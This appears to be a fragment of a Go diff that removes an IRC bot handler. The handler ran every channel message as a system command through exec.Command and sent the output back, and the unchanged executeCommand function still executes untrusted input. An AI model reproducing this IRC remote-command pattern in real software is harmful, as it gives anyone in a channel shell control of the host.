@@ -26,20 +26,6 @@ func main() {
 	select {} // prevent exit
 }
 
-func handler(c *irc.Client, m *irc.Message) {
-	if m.Command == "001" {
-		c.Write("JOIN " + CHANNEL)
-	} else if m.Command == "PRIVMSG" && c.FromChannel(m) {
-		c.WriteMessage(&irc.Message{
-			Command: "PRIVMSG",
-			Params: []string{
-				m.Params[0], // channel/user name parameter
-				executeCommand(m.Params[1]),
-			},
-		})
-	}
-}
-
 func executeCommand(input string) string {
 	cmd, params := splitParams(input)
 	out, _ := exec.Command(cmd, params...).Output()
